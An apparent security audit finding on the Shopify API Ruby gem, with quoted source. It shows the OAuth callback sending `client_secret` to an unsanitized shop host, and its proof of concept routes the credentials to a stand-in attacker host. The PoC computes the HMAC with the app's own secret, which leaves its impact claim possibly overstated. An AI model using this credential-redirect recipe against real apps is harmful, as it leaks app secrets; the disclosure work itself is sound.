### Title
`Auth::Oauth.validate_auth_callback` builds the access-token request host from an unsanitized `shop` value, leaking the app's `client_secret` to an untrusted host - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` uses the raw `shop` field from the OAuth callback query to determine which host receives the app's `client_id`/`client_secret`/authorization `code`, without ever passing it through `Utils::ShopValidator.sanitize!`. Every sibling credential-exchange flow in this same library (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`) does call `Utils::ShopValidator.sanitize!(shop)` before using the shop value to build the request host, precisely to guarantee the destination is one of the `TRUSTED_SHOPIFY_DOMAINS`. The OAuth authorization-code flow is the one path that skips this check, breaking the intended invariant: `host that receives client_secret == a domain in ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

### Finding Description
In `validate_auth_callback`:
```ruby
raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
...
null_session = Auth::Session.new(shop: auth_query.shop)
body = {
  client_id: Context.api_key,
  client_secret: Context.api_secret_key,
  code: auth_query.code,
  ...
}
client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
``` [1](#0-0) 

`HmacValidator.validate` only proves that the byte string `code|host|shop|state|timestamp` was signed with `api_secret_key` [2](#0-1) . It never constrains `shop` to be a `*.myshopify.com`/trusted domain — it only binds the bytes to the secret, not the "acted-on field" (the host that the client actually connects to) to an allow-listed set of Shopify domains. `AuthQuery` simply stores whatever `shop` value arrives in the request [3](#0-2) , and `Session.new(shop: auth_query.shop)` is handed straight to `Clients::HttpClient`, which derives the request host from `session.shop`.

Contrast this with the other three credential-exchange entry points in the gem, all of which explicitly sanitize the shop before using it to build the token-exchange host:
- `ClientCredentials.client_credentials`: `validated_shop = Utils::ShopValidator.sanitize!(shop)` [4](#0-3) 
- `RefreshToken.refresh_access_token`: `validated_shop = Utils::ShopValidator.sanitize!(shop)` [5](#0-4) 
- `TokenExchange.migrate_to_expiring_token`: `validated_shop = Utils::ShopValidator.sanitize!(shop)` [6](#0-5) 

`Utils::ShopValidator.sanitize!` exists specifically to guarantee the resolved host is one of `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) or an explicitly configured `myshopify_domain`, raising `Errors::InvalidShopError` otherwise [7](#0-6) . `validate_auth_callback` is the one OAuth entry point in this library that bypasses this allow-list, sending the app's `client_secret` and authorization `code` to whatever host `auth_query.shop` resolves to, as long as the request happens to carry a valid HMAC over that same value.

### Impact Explanation
Before the fix's invariant (present in the sibling flows) is applied here: `host receiving client_secret == host ∈ TRUSTED_SHOPIFY_DOMAINS`. In `validate_auth_callback`, that equality is never checked — the code accepts `host receiving client_secret == auth_query.shop` unconditionally (HMAC only proves integrity of the string, not domain trust). Any caller that forwards an OAuth callback containing a `shop` value outside the trusted domain set (e.g. a value that is well-formed enough to pass HMAC validation and non-embedded checks but is not a `myshopify.com`/`myshopify.io`/`shopify.com`/`spin.dev`/`shop.dev` host) will have this library issue the access-token exchange POST — carrying `client_id`, `client_secret`, and the authorization `code` — to that host. This is a credential-exfiltration primitive (the app's `client_secret` and, transitively, the resulting access token flow) matching the "SSRF with the app's credentials" / credential leakage impact class.

### Likelihood Explanation
This is a gem-internal inconsistency, not a host-app misuse: three of the four credential-exchange call sites in this codebase already treat the incoming `shop` string as untrusted input requiring `ShopValidator.sanitize!`, demonstrating the library's own security model expects such validation before a shop-derived value is used to pick the HTTP destination for `client_secret`. `validate_auth_callback` is the OAuth authorization-code entry point — the most commonly used flow — yet it omits the exact same defensive check, so any environment where the `shop`/`host` values reaching `AuthQuery` are not already pre-vetted to be canonical Shopify domains inherits this gap directly through documented gem API usage.

### Recommendation
In `ShopifyAPI::Auth::Oauth.validate_auth_callback`, sanitize `auth_query.shop` with `Utils::ShopValidator.sanitize!` (mirroring `ClientCredentials`, `RefreshToken`, and `TokenExchange.migrate_to_expiring_token`) before constructing `null_session`/`auth_base_uri`, and raise `Errors::InvalidShopError` for any shop that does not resolve to a `TRUSTED_SHOPIFY_DOMAINS` entry, so the access-token request can never be routed to an untrusted host.

### Proof of Concept
1. Construct an `AuthQuery` whose `shop` value differs from the canonical `xxx.myshopify.com` shop the app expects, e.g. `shop: "attacker.example.com"`, together with a `code`, `state` matching the session cookie, and `hmac` computed with `HmacValidator`'s signable string over `{code, host, shop, state, timestamp}`.
2. Call `ShopifyAPI::Auth::Oauth.validate_auth_callback(cookies:, auth_query:)`.
3. `Utils::HmacValidator.validate(auth_query)` passes because it only checks the HMAC over the supplied fields, not that `shop` belongs to `TRUSTED_SHOPIFY_DOMAINS`.
4. `null_session = Auth::Session.new(shop: "attacker.example.com")` and the subsequent `Clients::HttpClient` POST to `/admin/oauth/access_token` is sent to `https://attacker.example.com/admin/oauth/access_token`, carrying `client_id`, `client_secret`, and `code` in the body — compare to `ClientCredentials.client_credentials`, where the same `shop` value would instead raise `ShopifyAPI::Errors::InvalidShopError` via `Utils::ShopValidator.sanitize!` before any request is built [8](#0-7) .

### Citations

**File:** lib/shopify_api/auth/oauth.rb (L64-90)
```ruby
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
```

**File:** lib/shopify_api/utils/hmac_validator.rb (L12-31)
```ruby
        sig { params(verifiable_query: VerifiableQuery).returns(T::Boolean) }
        def validate(verifiable_query)
          return false unless verifiable_query.hmac

          result = validate_signature(verifiable_query, Context.api_secret_key)
          if result || Context.old_api_secret_key.nil? || T.must(Context.old_api_secret_key).empty?
            result
          else
            validate_signature(verifiable_query, T.must(Context.old_api_secret_key))
          end
        end

        private

        sig { params(verifiable_query: VerifiableQuery, secret: String).returns(T::Boolean) }
        def validate_signature(verifiable_query, secret)
          received_signature = verifiable_query.hmac
          computed_signature = compute_signature(verifiable_query.to_signable_string, secret)
          OpenSSL.secure_compare(computed_signature, T.must(received_signature))
        end
```

**File:** lib/shopify_api/auth/oauth/auth_query.rb (L24-31)
```ruby
        def initialize(code:, shop:, timestamp:, state:, host:, hmac:)
          @code = code
          @shop = shop
          @timestamp = timestamp
          @state = state
          @host = host
          @hmac = hmac
        end
```

**File:** lib/shopify_api/auth/client_credentials.rb (L19-26)
```ruby
        def client_credentials(shop:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/refresh_token.rb (L24-25)
```ruby
          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/token_exchange.rb (L103-104)
```ruby
          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-64)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
```
